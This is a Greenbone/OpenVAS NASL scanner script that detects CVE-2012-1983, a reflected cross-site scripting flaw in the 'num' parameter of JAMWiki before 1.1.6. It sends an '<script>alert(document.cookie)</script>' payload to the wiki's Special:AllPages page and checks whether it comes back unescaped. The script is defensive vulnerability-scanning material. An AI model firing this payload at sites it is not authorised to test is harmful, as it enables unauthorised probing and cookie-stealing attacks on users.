if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802621" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 52829 );
	script_cve_id( "CVE-2012-1983" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-04-02 11:11:11 +0530 (Mon, 02 Apr 2012)" );
	script_name( "JamWiki 'num' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=493" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/48638" );
	script_xref( name: "URL", value: "http://jamwiki.org/wiki/en/JAMWiki_1.1.6" );
	script_xref( name: "URL", value: "http://jira.jamwiki.org/browse/JAMWIKI-76" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SecPod_JamWiki_XSS_Vuln.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/111410/jamwiki-xss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "JAMWiki versions prior to 1.1.6" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user-supplied input to
  the 'num' parameter in Special:AllPages, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site." );
	script_tag( name: "solution", value: "Upgrade to JAMWiki version 1.1.6 or later." );
	script_tag( name: "summary", value: "This host is running JAMWiki and is prone to cross-site scripting
  vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 8080 );
for dir in nasl_make_list_unique( "/", "/jamwiki", "/JAMWiki", "/wiki", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/en/StartingPoints", port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && ContainsString( res, ">JAMWiki<" )){
		url = dir + "/en/Special:AllPages?num=\"<script>alert(document.cookie)" + "</script>";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

